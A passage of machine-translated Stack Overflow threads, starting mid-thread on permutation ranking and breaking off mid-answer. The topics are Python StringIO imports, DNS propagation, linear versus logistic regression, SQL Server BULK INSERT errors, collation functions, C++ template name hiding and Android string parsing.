> 时间：2012-08-27T18:22:06.110

让我们看一下排列`dacb`。这在 4 中按字典顺序排列在哪里！= 的 24 个排列`abcd`？

*   考虑第一个字母`d`。在剩余的字母 ( `acb`) 中有三个小于`d`, 和 3! = 6 个排列，从每个排列开始，总共 18 个排列。
*   考虑前两个字母`da`。在剩余的字母 ( `cb`) 中，没有小于小于的字母`a`（如果有的话，将有 2！= 2 个排列，`d`每个排列都以加号开头），总共有 0 个排列。
*   考虑前三个字母`dac`。在剩余的字母 ( `b`) 中，有一个小于`c`, 和 1! = 1 个以 开头的排列`dab`，总共 1 个排列。

所以总共有 19 个排列小于`dacb`。让我们检查一下。

```
>>> from itertools import permutations
>>> list(enumerate(''.join(p) for p in permutations('abcd')))
[(0, 'abcd'), (1, 'abdc'), (2, 'acbd'), (3, 'acdb'),
 (4, 'adbc'), (5, 'adcb'), (6, 'bacd'), (7, 'badc'),
 (8, 'bcad'), (9, 'bcda'), (10, 'bdac'), (11, 'bdca'),
 (12, 'cabd'), (13, 'cadb'), (14, 'cbad'), (15, 'cbda'),
 (16, 'cdab'), (17, 'cdba'), (18, 'dabc'), (19, 'dacb'),
 (20, 'dbac'), (21, 'dbca'), (22, 'dcab'), (23, 'dcba')] 
```

看起来不错。所以有4个！− 19 − 1 = 4 个大于 的排列`dacb`。

现在应该清楚如何概括该方法来制作算法了。这是 Python 中的一个实现：

```
from math import factorial

def lexicographic_index(p):
    """
    Return the lexicographic index of the permutation `p` among all
    permutations of its elements. `p` must be a sequence and all elements
    of `p` must be distinct.

    >>> lexicographic_index('dacb')
    19
    >>> from itertools import permutations
    >>> all(lexicographic_index(p) == i
    ...     for i, p in enumerate(permutations('abcde')))
    True
    """
    result = 0
    for j in range(len(p)):
        k = sum(1 for i in p[j + 1:] if i < p[j])
        result += k * factorial(len(p) - j - 1)
    return result

def lexicographic_followers(p):
    """
    Return the number of permutations of `p` that are greater than `p`
    in lexicographic order. `p` must be a sequence and all elements
    of `p` must be distinct.
    """
    return factorial(len(p)) - lexicographic_index(p) - 1 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-08-27T18:21:13.457

有一种基于阶乘数字系统和 Lehmer 代码的非常简洁的方法。这个想法是为每个可能的排列分配一个数字代码，该排列编码值出现的顺序（[Lehmer 代码](http://en.wikipedia.org/wiki/Lehmer_code)）。然后，您可以将 Lehmer 代码转换为一个数字，该数字确定所有排列列表中排列的索引（这使用[阶乘数字系统](http://en.wikipedia.org/wiki/Factorial_number_system)）。给定排列的索引，然后您可以计算 (n! - 1) 并减去索引以确定还有多少排列。

如果你很好奇如何做到这一点，我有[这个算法的实现，](http://keithschwarz.com/interesting/code/?dir=factoradic-permutation)它可以让你从排列映射到索引，反之亦然。我还[谈到了如何做到这一点](http://keithschwarz.com/talks/slides/fun-with-number-systems.pdf)；详情在幻灯片的后半部分。

希望这可以帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T18:27:52.343

这是回溯解决方案：

该程序排列给定字符串的所有解决方案，并返回解决方案列表以及这里有多少。

例如：因为`acb`它返回：

```
c a b
c b a
b a c
b c a
4 
```

代码：

```
#include <iostream>
#include <stdio>

using namespace std;

int v[100], n, cnt;
char *str;

void init(int k)
{
    v[k] = -1;
}

bool solutionReached( int k ) 
{
    if (k == n + 1)
        return true;
    return false;
}

void printSolution( int k ) 
{
    for (int i = 1; i < k; i++)
    {
        printf("%c ", str[v[i]]);
    }

    printf("\n");

    cnt++;
}

bool hasSuccesor( int k ) 
{
    if(v[k] < n - 1)
    {
        v[k]++;
        return true;
    }
    return false;
}

bool isValid( int k ) 
{
    for (int i = 1; i < k; i++)
    {
        if (v[i] == v[k])
        {
            return false;
        }
    }

    if (k == n)
    {
        char *cuv = (char *) malloc(n * sizeof(char));

        for (i = 0; i < n; i++)
            cuv[i] = str[v[i + 1]];

        if (strcmp(cuv, str) > 0)
        {
            return true;
        }
        else
            return false;
    }

    return true;
}

void bkt(int k)
{
    if(solutionReached(k))
        printSolution(k);
    else
    {
        init(k);
        while(hasSuccesor(k))
            if(isValid(k))
                bkt(k + 1);
    }
}

int main(int argc, char* argv[])
{
    str = "bca";

    n = strlen(str);
    bkt(1);

    printf("%i \n", --cnt);

    return 0;
} 
```

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-08-27T19:02:41.517

直接的 Python 解决方案依赖于 Python 排列生成器将从初始排序字符串按字典顺序生成的事实。

```
In [68]: from itertools import permutations

In [69]: from math import factorial

In [70]: def lexigreaterperms(perm):
    ...:     return factorial(len(perm)) - 1 -  list(permutations(sorted(perm))).index(tuple(perm))

In [71]: lexigreaterperms('bca')
Out[71]: 2

In [72]: lexigreaterperms('dacb')
Out[72]: 4 
```

# python - 如何在 python 3 中替换此语句“StringIO import StringIO”（在 python 2 中可用）

> ID：12146912
> 
> 赞同：2
> 
> 时间：2012-08-27T17:48:55.640
> 
> 标签：python, xml, parsing

显然，我是 Python 新手。

我想在下面的代码中使用 StringIO：提取 example.xml

```
 import os
os.chdir('d:/py/xml/')

from lxml import etree
from StringIO import StringIO

#----------------------------------------------------------------------
def parseXML(xmlFile):
    """
    Parse the xml
    """
    f = open(xmlFile)
    xml = f.read()
    f.close()

    tree = etree.parse(StringIO(xml))
    context = etree.iterparse(StringIO(xml))
    for action, elem in context:
        if not elem.text:
            text = 'None'
        else:
            text = elem.text
        print (elem.tag + ' => ' + text)

if __name__ == "__main__":

parseXML("example.xml") 
```

但我不断收到这个消息

***语法错误：从 io 导入导入 StringIO：d:\py\xml\example.py，第 621 行文件“d:\py\xml\example.py”，第 6 行，在？从 io 导入导入 StringIO***

我做了谷歌，但它说要导入 io 模型并将 io.StringIO 或 io.BytesIO 用于文本或数据...

谁能告诉我，我该怎么做？

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T17:51:30.523

[http://docs.python.org/release/3.0.1/whatsnew/3.0.html#text-vs-data-instead-of-unicode-vs-8-bit](http://docs.python.org/release/3.0.1/whatsnew/3.0.html#text-vs-data-instead-of-unicode-vs-8-bit)：

> StringIO 和 cStringIO 模块不见了。相反，导入 io 模块并分别对文本和数据使用 io.StringIO 或 io.BytesIO 。

`from io import StringIO`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-27T17:51:15.933

在 Python3 中，`StringIO`位于`io`：

```
from io import StringIO 
```

（不是`from io import import StringIO`，关键字`import`只出现一次。）

请注意，`2to3`脚本会自动为您执行此更改。

# asp.net - 无法通过浏览器访问子域 URL

> ID：12146913
> 
> 赞同：0
> 
> 时间：2012-08-27T17:48:59.167
> 
> 标签：asp.net, wcf, shared-hosting

我面临一个奇怪的问题。

我的 ISP 在虚拟目录中托管了一个 Web 服务，该目录位于子域下。现在从我的系统（或网络）我无法访问该网络服务。每次我运行 fiddler 时，我都会看到**“my_sub_domain.com”的 DNS 查找失败。没有这样的主机是已知的。**

但是如果我通过 web-sniffer.com 运行它，它会返回**Status: HTTP/1.1 200 OK**

我不明白出了什么问题，有没有人遇到过这样的事情？我的网络设置有问题吗？你能告诉我如何解决这个问题吗？

如果您需要更多信息，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:53:21.460

这听起来像是一个 DNS 问题。您的 DNS 服务器似乎还没有将子域的 A 记录传播给它，而 web-sniffer.com 使用的 DNS 服务器已经将它传播给它，因此可以看到它正在返回一个有效的记录和 IP 地址。

在等待它传播到您的 DNS 提供商时，您可以使用正确的 IP 地址向您的机器的主机文件添加一个条目，以便您继续工作。

# machine-learning - 线性回归和逻辑回归有什么区别？

> ID：12146914
> 
> 赞同：272
> 
> 时间：2012-08-27T17:49:05.570
> 
> 标签：machine-learning, data-mining, linear-regression

当我们必须预测[分类](https://en.wikipedia.org/wiki/Categorical_variable)（或离散）结果的值时，我们使用[逻辑回归](https://en.wikipedia.org/wiki/Logistic_regression)。我相信我们也使用[线性回归](https://en.wikipedia.org/wiki/Linear_regression)来预测给定输入值的结果值。

那么，这两种方法有什么区别呢？

* * *

## 回答 #1

> 赞同：303
> 
> 时间：2016-08-30T12:07:11.677

*   **作为概率的线性回归输出**

    使用线性回归输出作为概率是很诱人的，但这是一个错误，因为输出可以是负数，并且大于 1，而概率不能。由于回归实际上可能产生小于 0 甚至大于 1 的概率，因此引入了逻辑回归。

    资料来源： http: [//gerardnico.com/wiki/data_mining/simple_logistic_regression](http://gerardnico.com/wiki/data_mining/simple_logistic_regression)

    [![在此处输入图像描述](../Images/070a98e618ccf08a3de7551ffd45b435.png)](https://i.stack.imgur.com/rhVmk.jpg)

*   **结果**

    在线性回归中，结果（因变量）是连续的。它可以有无数个可能值中的任何一个。

    在逻辑回归中，结果（因变量）只有有限数量的可能值。

*   **因变量**

    当响应变量本质上是分类时，使用逻辑回归。例如，是/否、真/假、红/绿/蓝、1st/2nd/3rd/4th 等。

    当您的响应变量是连续的时，使用线性回归。例如，体重、身高、小时数等。

*   **方程**

    线性回归给出了一个形式为 Y = mX + C 的方程，表示方程为 1。

    然而，逻辑回归给出了一个形式为 Y = e ^X + e ^(-X的方程)

*   **系数解释**

    在线性回归中，自变量的系数解释非常简单（即保持所有其他变量不变，该变量增加一个单位，因变量预计增加/减少 xxx）。

    但是，在逻辑回归中，取决于您使用的族（二项式、泊松等）和链接（log、logit、inverse-log 等），解释是不同的。

*   **误差最小化技术**

    线性回归使用*普通最小二乘*法来最小化误差并达到最佳拟合，而逻辑回归使用*最大似然*法来求解。

    线性回归通常通过最小化模型对数据的最小二乘误差来解决，因此大的误差会被二次惩罚。

    逻辑回归正好相反。使用逻辑损失函数会导致较大的错误被惩罚为渐近常数。

    考虑对分类 {0, 1} 结果进行线性回归，以了解为什么这是一个问题。如果您的模型预测结果是 38，那么当真值是 1 时，您什么也没有丢失。线性回归会尝试减少 38，逻辑不会（尽可能多）^([2](https://stats.stackexchange.com/a/29340))。

* * *

## 回答 #2

> 赞同：212
> 
> 时间：2012-08-27T20:26:25.223

在线性回归中，结果（因变量）是连续的。它可以有无数个可能值中的任何一个。在逻辑回归中，结果（因变量）只有有限数量的可能值。

例如，如果 X 包含以平方英尺为单位的房屋面积，并且 Y 包含这些房屋的相应售价，您可以使用线性回归来预测售价作为房屋大小的函数。虽然可能的销售价格实际上可能不是*任何*，但有很多可能的值，需要选择线性回归模型。

相反，如果您想根据大小预测房屋的售价是否会超过 20 万美元，您可以使用逻辑回归。可能的输出要么是，房子的售价将超过 20 万美元，要么是不，房子不会。

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2018-06-03T13:53:34.633

只是补充以前的答案。

**线性回归**

旨在解决预测/估计给定元素 X（例如 f(x)）的输出值的问题。预测的结果是一个连续函数，其中的值可能是正数或负数。在这种情况下，您通常有一个包含大量*示例*的输入数据集以及每个示例的输出值。目标是能够将模型*拟合*到该数据集，以便您能够预测新的不同/从未见过的元素的输出。以下是将一条线拟合到一组点的经典示例，但通常线性回归可用于拟合更复杂的模型（使用更高的多项式次数）：

[![在此处输入图像描述](../Images/46024ca1cdc2e71fe7444662135d5916.png)](https://i.stack.imgur.com/4NRfx.png)

**解决问题**

线性回归可以通过两种不同的方式解决：

1.  正规方程（直接解决问题的方法）
2.  梯度下降（迭代方法）

**逻辑回归**

旨在解决给定元素的**分类**问题，您必须在 N 个类别中对其进行分类。典型的例子是，例如，给定一封邮件以将其分类为垃圾邮件，或者给定车辆查找它属于哪个类别（汽车、卡车、货车等）。这基本上是输出是一组有限的离散值。

**解决问题**

逻辑回归问题只能通过使用梯度下降来解决。该公式通常与线性回归非常相似，唯一的区别是使用了不同的假设函数。在线性回归中，假设具有以下形式：

```
h(x) = theta_0 + theta_1*x_1 + theta_2*x_2 .. 
```

其中 theta 是我们试图拟合的模型，[1, x_1, x_2, ..] 是输入向量。在逻辑回归中，假设函数不同：

```
g(x) = 1 / (1 + e^-x) 
```

[![在此处输入图像描述](../Images/33ef08b4eb5623b831224c2b3651b9e1.png)](https://i.stack.imgur.com/G4vfu.png)

这个函数有一个很好的属性，基本上它将任何值映射到范围[0,1]，这适合在分类期间处理概率。例如，在二进制分类的情况下，g(X) 可以解释为属于正类的概率。在这种情况下，通常您有不同的类，它们由一个*决策边界*分隔，该边界基本上是一条决定不同类之间分离的*曲线*。以下是分为两类的数据集示例。

[![在此处输入图像描述](../Images/2cbc2a8f10af880329521f9cc0853967.png)](https://i.stack.imgur.com/YHMpC.png)

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2018-03-14T05:15:14.767

基本区别：

线性回归基本上是一个回归模型，这意味着它将给出函数的非离散/连续输出。所以这种方法给出了价值。例如：给定 x 什么是 f(x)

例如，给定一组不同因素的训练集和训练后的房产价格，我们可以提供所需的因素来确定房产价格。

逻辑回归基本上是一种二元分类算法，这意味着这里将有函数的离散值输出。例如：对于给定的 x，如果 f(x)>threshold 将其分类为 1，否则将其分类为 0。

例如，给定一组脑肿瘤大小作为训练数据，我们可以使用该大小作为输入来确定它是良性肿瘤还是恶性肿瘤。因此，这里的输出是离散的 0 或 1。

*这里的函数基本上是假设函数

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2017-10-05T03:29:38.593

简单地说，线性回归是一种回归算法，它输出一个可能的连续和无穷大的值；逻辑回归被认为是一种二元分类器算法，它输出属于标签（0 或 1）的输入的“概率”。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2018-05-04T01:59:00.960

它们在求解解决方案方面都非常相似，但正如其他人所说，一个（逻辑回归）用于预测类别“适合”（Y/N 或 1/0），另一个（线性回归）用于预测一个值。

因此，如果您想预测您是否患有癌症 Y/N（或概率），请使用逻辑。如果您想知道使用线性回归能活多少年！

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2019-02-28T06:03:13.140

回归意味着连续变量，线性意味着y和x之间存在线性关系。Ex=您试图根据多年经验来预测薪水。所以这里的薪水是自变量（y），经验年数是因变量（x）。y=b0+ b1*x1 [![线性回归](../Images/763e5993f7ec67034174997ad870ef59.png)](https://i.stack.imgur.com/kW8YP.png) 我们试图找到常数 b0 和 b1 的最佳值，这将为我们提供最适合您的观察数据的线。它是一个直线方程，它给出了从 x=0 到非常大的值的连续值。这条线称为线性回归模型。

逻辑回归是一种分类技术。不要被术语回归误导。在这里，我们预测 y = 0 还是 1。

在这里，我们首先需要从下面的公式中找到给定 x 的 p(y=1) (wprobability of y=1)。

[![概率](../Images/84b9bfe390960c7b4e210c415c47f6c0.png)](https://i.stack.imgur.com/pTIw4.png)

通过以下公式，概率 p 与 y 相关

[![s](../Images/7e15f6de3a94c215333e76bc261728a7.png)](https://i.stack.imgur.com/qllEd.png)

Ex=我们可以将患癌几率超过50%的肿瘤分类为1，将患癌几率低于50%的肿瘤分类为0。 [![5](../Images/52016eeb3f8ce42541a3364db696a75f.png)](https://i.stack.imgur.com/fKW8B.png)

这里红点将被预测为 0，而绿点将被预测为 1。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2018-06-07T14:29:59.720

不能更同意上述评论。除此之外，还有一些不同之处，例如

在线性回归中，残差被假定为正态分布。在逻辑回归中，残差需要是独立的，但不是正态分布的。

线性回归假设解释变量值的恒定变化导致响应变量的恒定变化。如果响应变量的值表示概率（在逻辑回归中），则此假设不成立

GLM（广义线性模型）不假设因变量和自变量之间存在线性关系。但是，它假设 logit 模型中的链接函数和自变量之间存在线性关系。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2018-07-07T18:34:50.617

```
| Basis                                                           | Linear                                                                         | Logistic                                                                                                            |
|-----------------------------------------------------------------|--------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------|
| Basic                                                           | The data is modelled using a straight line.                                    | The probability of some obtained event is represented as a linear function of a combination of predictor variables. |
| Linear relationship between dependent and independent variables | Is required                                                                    | Not required                                                                                                        |
| The independent variable                                        | Could be correlated with each other. (Specially in multiple linear regression) | Should not be correlated with each other (no multicollinearity exist).                                              | 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2019-04-26T13:25:31.923

在线性回归中，结果是连续的，而在逻辑回归中，结果只有有限数量的可能值（离散）。

示例：在一个场景中，x 的给定值是以平方英尺为单位的地块大小，然后预测 y 即地块的比率属于线性回归。

相反，如果您想根据大小预测该地块的售价是否会超过 300000 卢比，则可以使用逻辑回归。可能的输出是“是”，该地块的售价将超过 300000 卢比，或者“否”。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2018-09-16T12:21:40.447

逻辑回归用于预测分类输出，如是/否、低/中/高等。您基本上有 2 种类型的逻辑回归二元逻辑回归（是/否、批准/不批准）或多类逻辑回归（低/中/高，数字从 0-9 等）

另一方面，线性回归是如果您的因变量 (y) 是连续的。y = mx + c 是一个简单的线性回归方程（m = 斜率，c 是 y 截距）。多线性回归有超过 1 个自变量 (x1,x2,x3 ... 等)

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2018-06-26T22:08:55.890

To put it simply, if in linear regression model more test cases arrive which are far away from the threshold(say =0.5)for a prediction of y=1 and y=0\. Then in that case the hypothesis will change and become worse.Therefore linear regression model is not used for classification problem.

Another Problem is that if the classification is y=0 and y=1, h(x) can be > 1 or < 0.So we use Logistic regression were 0<=h(x)<=1.

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2020-09-03T10:14:31.980

线性回归和逻辑回归之间的基本区别是： **线性回归**用于预测连续或数值，但是当我们正在寻找预测分类**逻辑回归**的值时，就会出现。

逻辑回归用于二元分类。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2020-05-23T15:11:53.553

在线性回归的情况下，结果是连续的，而在逻辑回归的情况下，结果是离散的（不连续的）

要执行线性回归，我们需要因变量和自变量之间的线性关系。但是要执行逻辑回归，我们不需要因变量和自变量之间的线性关系。

线性回归是关于在数据中拟合一条直线，而逻辑回归是关于将曲线拟合到数据中。

线性回归是机器学习的回归算法，而逻辑回归是机器学习的分类算法。

线性回归假设因变量的高斯（或正态）分布。逻辑回归假设因变量的二项式分布。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2018-05-28T12:48:41.403

简而言之：线性回归提供连续输出。即一系列值之间的任何值。逻辑回归给出离散输出。即是/否，0/1 种输出。

# database - 无法从链接服务器“（null）”的 OLE DB 提供程序“BULK”中获取行

> ID：12146915
> 
> 赞同：26
> 
> 时间：2012-08-27T17:49:06.047
> 
> 标签：database, csv, bulk

我尝试使用 1.4 GB 大小的 .csv 文件中的大量数据加载我的数据库。但是当我尝试运行我的代码时，我得到了错误。

这是我的代码：

```
USE [Intradata NYSE] 
GO
CREATE TABLE CSVTest1
(Ticker varchar(10) NULL,
dateval date NULL,
timevale time(0) NULL,
Openval varchar(10) NULL,
Highval varchar(10) NULL,
Lowval varchar(10) NULL,
Closeval varchar(10) NULL,
Volume varchar(10) NULL
)
GO

BULK
INSERT CSVTest1
FROM 'c:\intramerge.csv'
WITH
(
FIELDTERMINATOR = ',',
ROWTERMINATOR = '\n'
)
GO
--Check the content of the table.
SELECT *
FROM CSVTest1
GO
--Drop the table to clean up database.
DROP TABLE CSVTest1
GO 
```

我尝试建立一个包含大量股票报价的数据库。但我收到此错误消息：

> 消息 4832，级别 16，状态 1，第 2 行批量加载：在数据文件中遇到意外的文件结尾。消息 7399，级别 16，状态 1，第 2 行链接服务器“（null）”的 OLE DB 提供程序“BULK”报告了错误。提供商没有提供有关该错误的任何信息。消息 7330，级别 16，状态 2，第 2 行无法从链接服务器“（null）”的 OLE DB 提供程序“BULK”获取行

我不太懂 SQL，但我希望能抓住一两件事。希望有人看到什么可能非常明显。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2015-11-13T22:40:28.217

复活一个老问题，但万一这对其他人有帮助：经过多次反复试验，我终于（终于！）能够通过改变这个来摆脱这个错误：

```
ROWTERMINATOR = '\n' 
```

对此：

```
ROWTERMINATOR = '0x0A' 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2014-10-22T14:23:47.747

我有同样的问题。

解决方案：

在 notepad+ 等文本编辑器中验证 CSV 或文本文件。最后一行可能不完整。去掉它。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-05-22T20:17:51.097

当我的 CSV 中的分隔字段数与表中的列数不同时，我得到了同样的错误。检查您是否在`intramerge.csv`.

确定有问题的行的方法：

1.  在电子表格中打开 CSV，将过滤器添加到所有数据并查找空值

[![在此处输入图像描述](../Images/d988da226b576d08cffd4b1fb9bb942a.png)](https://i.stack.imgur.com/JGLK2.png)

这是列较少的行 [![在此处输入图像描述](../Images/8f56fb69d00472b619bbcd1d33f847b6.png)](https://i.stack.imgur.com/YmO0O.png)

2.  使用此页面[https://csvlint.com](https://csvlint.com)创建您的验证规则，您也可以在 CSV 中检测您的问题。

[![在此处输入图像描述](../Images/2f90a2c239496a86b071966916deb3ac.png)](https://i.stack.imgur.com/Tx1Vz.png)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2019-09-01T12:14:02.803

这是我的解决方案：放弃。

我总是最终使用 SSMS 和`[ Tasks > Import Data ]`.

我*从未*设法使用这种方法导入真实世界的 .csv 文件。这是完全无用的功能，仅适用于现实世界中不存在的原始数据集。也许我从来没有运气，因为我处理的数据集非常混乱，并且是由第三方生成的。

如果它出错了，它不会提供任何关于原因的线索。微软，你在这方面的无能让我感到难过。

微软，也许会添加一些错误消息，所以它说*为什么*它拒绝它？因为如果你不知道它失败的原因，几乎不可能解决这个问题！

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2015-11-24T15:34:38.653

当我的格式文件（即使用`FORMATFILE`参数指定）的列宽小于实际列大小（例如`varchar(50)`，而不是`varchar(100)`）时，我收到此错误。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2014-02-13T18:10:25.150

这是一个古老的问题，但似乎我的发现会启发其他一些有类似问题的人。

默认 SSIS 超时值似乎是 30 秒。这使得包中的任何服务绑定或 IO 绑定操作都远远超出该超时值并导致超时。增加该超时值（更改为“0”表示没有超时）将解决该问题。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2019-10-02T09:35:07.503

我遇到了类似的问题，但在这种情况下，正在加载的文件包含一些空行。删除空白行解决了它。

或者，当文件被分隔时，我在空白行中添加了正确数量的分隔符，这再次允许文件成功导入 - 如果需要加载空白行，请使用此选项。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2017-03-24T20:07:51.437

这可能是一个完整的 1.5GB 的坏主意，但您可以在一个子集上尝试它（从几行开始）：

```
CREATE TABLE CSVTest1
(Ticker varchar(MAX) NULL,
    dateval varchar(MAX) NULL,
    timevale varchar(MAX) NULL,
    Openval varchar(MAX) NULL,
    Highval varchar(MAX) NULL,
    Lowval varchar(MAX) NULL,
    Closeval varchar(MAX) NULL,
    Volume varchar(MAX) NULL
) 
```

... 做你的 BULK INSERT，然后

```
SELECT MAX(LEN(Ticker)),
    MAX(LEN(dateval)),
    MAX(LEN(timevale)),
    MAX(LEN(Openval)),
    MAX(LEN(Highval)),
    MAX(LEN(Lowval)),
    MAX(LEN(Closeval)),
    MAX(LEN(Volume)) 
```

这将有助于告诉您您对列的估计是否有偏差。您可能还会发现您的列有问题，或者 BULK INSERT 可能由于其他原因仍然失败。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2016-09-05T09:25:04.757

当我的 SQL 表中的 char 字段对于输入的文本来说太小时，我得到了这个异常。尝试使列更大。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2021-04-29T18:29:18.563

对于碰巧看到这篇文章的任何人，我的问题是对语法的简单疏忽。我将它与一些 Python 内联，并将其直接带入 SSMS：

```
BULK 
INSERT access_log
FROM '[my path]'
WITH (FIELDTERMINATOR = '\\t', ROWTERMINATOR = '\\n'); 
```

当然，问题在于 Python 中需要双反斜杠，因为我将它作为字符串嵌入到脚本中。更正`'\t'`并`'\n'`显然修复了它。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2021-09-27T06:21:53.197

Please look at your file, if any special characters or spaces at end of the file, then remove and try again.

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2020-11-18T15:03:37.527

如果您的文件列用“;”分隔，也会发生这种情况 但是您使用“，”作为 FIELDTERMINATOR（或相反）

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2021-09-09T07:33:21.947

我也发生了同样的事情，原来这是由于重复的列名。将列重命名为唯一。＆它工作正常

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2020-03-09T11:19:01.143

批量插入不会告诉您导入值是否“适合”目标表的字段格式。

例如：我尝试将十进制值导入浮点字段。但由于这些值都有一个逗号作为小数点，因此无法将它们插入表中（它需要一个点）。

当提供的 CVS 值是从 Excel 文件导出时，通常会发生这些意外结果。将 Excel 文件保存为 CSV 时，您计算机的区域设置将决定使用哪个小数点。不同人提供的 CSV 会导致不同的结果。

解决方案：将所有字段导入为VARCHAR，然后尝试处理这些值。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2018-06-22T12:38:30.037

我只想分享我对此的解决方案。问题是表列的大小，使用 varchar(255) 并且都应该工作。

# sql-server - 排序规则作为函数参数

> ID：12146916
> 
> 赞同：1
> 
> 时间：2012-08-27T17:49:15.963
> 
> 标签：sql-server, sql-server-2008, entity-framework, sql-server-2005

我有一个应该以任何语言存储数据的数据库，会有一个列告诉我它是哪个语言环境，所以我不能依赖数据库排序规则，并且必须在运行时在查询中指定排序规则。

我也有我想用于数据访问的问题`EF`，因为我们知道使用 EF 无法在运行时指定排序规则。我正在考虑创建一个将排序规则作为参数并将该函数应用于所有`Linq`查询的 sql 函数。

但这失败了

```
CREATE FUNCTION fn_Compare
(   
    @TextValue nvarchar(max),
    @Culture varchar(10)
)
RETURNS  nvarchar(max)
AS
BEGIN
    RETURN @TextValue COLLATE @Culture
END
GO 
```

有谁知道这是否可以做到？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T18:49:15.747

你不可以做这个。函数返回的排序规则需要在所有返回值中保持一致。例如，以下会产生错误：

```
create function testfn (@test varchar(100), @i int)
returns varchar(100)
as
begin
    return(case when @i = 0 then @test collate SQL_Latin1_General_CP1_CS_AS
              else @test collate SQL_Latin1_General_CP1_CI_AS
         end)
end; 
```

该错误是由于排序规则冲突造成的。

你可以做的是使用：

```
alter database collate <whatever> 
```

或者，或者，使用所需的排序规则创建一个新的工作数据库。

# c++ - 派生类中的 C++ 重载模板函数

> ID：12146919
> 
> 赞同：2
> 
> 时间：2012-08-27T17:49:22.870
> 
> 标签：c++, templates

我知道您可以根据模板参数重载模板：

```
template <class T> void test() {
    std::cout << "template<T>" << std::endl;
}
void test() {
    std::cout << "not a template" << std::endl;
} 
```

然后在一些函数中：

```
test<int>();
test(); 
```

将正确解决您想要的两个不同版本的 test() 中的哪一个。但是，如果我现在在具有继承的类中执行此操作：

```
class A {
public:
    void test() {
       std::cout << "A::Test: not a template" << std::endl;
    }
};
class B : public A {
public:
    template <class T>
    void test() {
       std::cout << "B::Test: template<T>" << std::endl;
    }
}; 
```

然后在一个函数内部：

```
B b;
b.test<int>();
b.test(); 
```

`b.test<int>();`有效但`b.test();`不：

```
error: no matching function for call to ‘B::test()’
note: candidate is:
note: template<class T> void B::test() 
```

为什么这个/有什么方法可以根据模板参数正确解析 2 个版本？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:52:45.887

与往常一样，派生类中定义的名称隐藏了基类中相同名称的使用。要将基类中的名称提升到派生类中，请添加

```
using A::test; 
```

到派生类。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:57:30.930

您所观察到的称为隐藏名称。派生类中的名称`test`隐藏`test`在基类中。如果没有`using`声明，则在通过该对象的确切类型调用时将永远找不到名称（强制转换为基类或显式限定调用也有帮助）。

# android - 扫描字符串中的字符并返回有界文本

> ID：12146921
> 
> 赞同：2
> 
> 时间：2012-08-27T17:49:28.377
> 
> 标签：android, string-parsing

我正在编写一个字典类型的应用程序。我有一个哈希映射术语和定义的列表。基本前提是有一个单词列表，您可以点击以查看定义。

我已经启动并运行了这个功能 - 我现在正在尝试在定义之间放置动态链接。

示例：假设用户点击列表中的一个项目，“狗”。定义可能会弹出，说“一种小毛茸茸的[动物]，通常作为宠物饲养。另见[猫]。”。目的是用户可以单击单词 [animal] 或 [cat] 并转到适当的定义。我已经费心确保定义中的任何链接都以方括号为界，因此只需扫描弹出字符串中的文本[用括号括起来]并提供指向该定义的链接。

请注意，定义可以包含多个链接，而有些定义不包含任何链接。

我可以在字符串显示之前访问它，所以我想最好的方法是在显示对话框之前进行扫描并准备好链接。

问题是，我将如何扫描被方括号包围的文本，并返回包含在这些括号中的文本？

理想情况下，实际显示的对话框应该没有方括号，而且我还需要找出一种将超链接放入对话框文本的方法，但是当我谈到它时，我会越过那座桥。

我是 Java 新手——我来自 MATLAB，只是为了维持生计，但这是一项比我迄今为止必须处理的任务更不常见的任务！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:59:03.030

很简单，我认为...由于文本在括号中，您需要扫描每个字母。所以基本配方是：

*   在`while`循环中扫描每个字符（比方说，`while i < len(text)`）
*   如果扫描的字符是`[`：
    *   `i++;`
    *   将索引处的字母添加`i`到一些临时变量
    *   `while (character @ i) != ']'`将其附加到临时变量
    *   将此临时变量存储在结果列表中。

一些技巧：

*   如果您使用上述解决方案，请使用`StringBuilder`附加文本（因为常规`string`是不可变的）
*   您可能还希望（我认为这更好）首先存储所有方括号的*开始*和*结束*位置，然后`string.substring()`在每一对上使用以获取里面的文本。这样，您首先迭代定义以查找括号（可能会捕获不匹配的括号，以进行早期错误处理），然后迭代索引对...

至于链接，也许这会有用：[How can I get clickable hyperlinks in AlertDialog from a string resource?](https://stackoverflow.com/questions/1997328/android-clickable-hyperlinks-in-alertdialog)

* * *

## 回答 #2

> 赞同：0
> 
